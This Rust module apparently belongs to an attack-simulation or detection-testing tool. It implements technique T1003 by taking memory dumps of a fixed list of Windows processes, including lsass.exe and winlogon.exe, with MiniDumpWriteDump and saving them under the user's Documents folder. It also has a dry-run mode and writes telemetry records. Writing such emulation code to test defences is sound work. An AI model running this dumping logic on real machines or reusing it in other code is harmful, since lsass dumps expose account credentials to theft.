//! Executes process dump via MiniDump (T1003).

use crate::core::config::Config;
use crate::core::simulation::Simulation;
use crate::core::telemetry::{ActionRecord, write_action_record};
use crate::core::logger;
use anyhow::{Context, Result};
use chrono::Utc;
use std::ffi::CStr;
use std::fs::{create_dir_all, File};
use std::os::windows::io::AsRawHandle;
use std::path::PathBuf;

/// Windows-specific implementation
#[cfg(windows)]
mod imp {
    use super::*;
    use windows::core::Error as WinError;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::System::Diagnostics::Debug::{MiniDumpWriteDump, MiniDumpNormal, MINIDUMP_TYPE};
    use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    fn telemetry_dir() -> Option<PathBuf> {
        dirs::home_dir().map(|mut p| {
            p.push("Documents");
            p.push("MagnetTelemetry");
            p
        })
    }

    fn find_pid_by_name(name: &str) -> Option<u32> {
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()? };
        let mut entry: PROCESSENTRY32 = unsafe { std::mem::zeroed() };
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        if unsafe { Process32First(snapshot, &mut entry) }.is_ok() {
            loop {
                let exe_name = unsafe { CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8) };
                if let Ok(s) = exe_name.to_str() {
                    if s.eq_ignore_ascii_case(name) {
                        let _ = unsafe { CloseHandle(snapshot) };
                        return Some(entry.th32ProcessID);
                    }
                }
                if unsafe { Process32Next(snapshot, &mut entry) }.is_err() {
                    break;
                }
            }
        }

        let _ = unsafe { CloseHandle(snapshot) };
        None
    }

    fn dump_process(pid: u32, proc_name: &str, out_dir: &PathBuf) -> std::result::Result<PathBuf, WinError> {
        unsafe {
            create_dir_all(out_dir).ok();

            let process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;

            let safe_name = proc_name.replace('\\', "_").replace('/', "_");
            let filename = format!("{}-{}.dmp", safe_name, pid);
            let mut full = out_dir.clone();
            full.push(&filename);

            let dump_file = File::create(&full).map_err(|_| WinError::from_win32())?;
            let dump_handle = HANDLE(dump_file.as_raw_handle() as *mut _);

            MiniDumpWriteDump(
                process_handle,
                pid,
                dump_handle,
                MINIDUMP_TYPE(MiniDumpNormal.0),
                None,
                None,
                None,
            )?;

            let _ = CloseHandle(process_handle);
            Ok(full)
        }
    }

    pub fn run_minidump(cfg: &Config) -> Result<()> {
        let processes = [
            "notepad.exe",
            "spoolsv.exe",
            "explorer.exe",
            "svchost.exe",
            "audiodg.exe",
            "dwm.exe",
            "lsass.exe",
            "winlogon.exe",
            "smss.exe",
        ];

        logger::action_running("Minidump: searching processes and writing minidumps");

        if cfg.dry_run {
            logger::info("dry-run: would attempt to find and dump target processes");
            let rec = ActionRecord {
                test_id: cfg.test_id.clone(),
                timestamp: Utc::now().to_rfc3339(),
                action: "minidump_proc".into(),
                status: "dry-run".into(),
                details: "dry-run: no dumps written".into(),
                artifact_path: None,
            };
            let _ = write_action_record(cfg, &rec);
            logger::action_ok();
            return Ok(());
        }

        let out_dir = telemetry_dir().map(|mut d| { d.push("minidumps"); d }).ok_or_else(|| anyhow::anyhow!("could not determine telemetry dir"))?;
        create_dir_all(&out_dir).context("creating minidump output dir")?;

        let mut written = Vec::new();

        for &pname in &processes {
            logger::info(&format!("searching for {}", pname));
            match find_pid_by_name(pname) {
                Some(pid) => {
                    logger::info(&format!("found {} pid={}", pname, pid));
                    match dump_process(pid, pname, &out_dir) {
                        Ok(path) => {
                            logger::info(&format!("wrote dump to {}", path.display()));
                            written.push(path.display().to_string());
                        }
                        Err(e) => {
                            logger::warn(&format!("failed to dump {} (pid={}): {}", pname, pid, e));
                        }
                    }
                }
                None => {
                    logger::warn(&format!("could not find process {}", pname));
                }
            }
        }

        let details = if written.is_empty() {
            "no dumps written".to_string()
        } else {
            format!("dumps: {}", written.join(", "))
        };

        let rec = ActionRecord {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            action: "minidump_proc".into(),
            status: "completed".into(),
            details,
            artifact_path: Some(out_dir.display().to_string()),
        };
        let _ = write_action_record(cfg, &rec);

        logger::action_ok();
        Ok(())
    }
}


#[derive(Default)]
pub struct MinidumpProc;

impl Simulation for MinidumpProc {
    fn name(&self) -> &'static str {
        "windows::minidump_proc"
    }

    fn run(&self, cfg: &Config) -> Result<()> {
        imp::run_minidump(cfg)
    }
}
